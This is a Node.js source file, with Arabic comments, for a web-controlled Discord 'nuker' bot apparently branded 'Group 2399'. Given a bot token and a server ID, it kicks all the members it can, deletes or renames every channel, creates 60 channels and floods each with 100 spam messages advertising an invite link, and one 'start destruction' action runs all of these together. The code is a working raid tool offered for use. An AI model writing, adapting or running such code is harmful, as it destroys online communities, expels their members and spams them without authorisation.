const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// تشغيل الصفحة الرئيسية
app.get('/', (res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;

    // Intents كاملة للتحكم الشامل
    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMembers,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ] 
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);
        
        if (!guild) return res.status(404).send({ status: '❌ لم يتم العثور على السيرفر' });

        const name = customName || "Group 2399";
        const message = customMsg || "# Group 2399 is here\nhttps://discord.gg/DcKVbTkW8";

        // تنفيذ الأوامر بناءً على النص القادم من الموقع
        if (action === 'طرد الجميع') {
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick('Lord 2399').catch(() => {}); });
        }

        if (action === 'تغيير الأسماء') {
            guild.channels.cache.forEach(c => c.setName(name).catch(() => {}));
        }

        if (action === 'إنشاء رومات') {
            for (let i = 0; i < 60; i++) {
                guild.channels.create({ name: name, type: ChannelType.GuildText }).catch(() => {});
            }
        }

        if (action === 'إرسال سبام') {
            guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(c => {
                for (let i = 0; i < 100; i++) { c.send(message).catch(() => {}); }
            });
        }

        if (action === 'ابدأ' || action === 'ابدأ التدمير 💀') {
            // تدمير شامل ورا بعض
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
            
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            
            for (let i = 0; i < 60; i++) {
                guild.channels.create({ name: name, type: ChannelType.GuildText })
                .then(ch => {
                    for (let j = 0; j < 100; j++) ch.send(message).catch(() => {});
                }).catch(() => {});
            }
        }

        // إغلاق البوت بعد التنفيذ بـ 10 ثواني لتوفير الموارد
        setTimeout(() => client.destroy(), 10000);

        res.send({ status: `🚀 تم إطلاق [${action}] بنجاح!` });

    } catch (error) {
        console.error(error);
        res.status(500).send({ status: '❌ خطأ: التوكن غلط أو البوت ما عنده صلاحيات' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Lord System 2399 is Online!'));
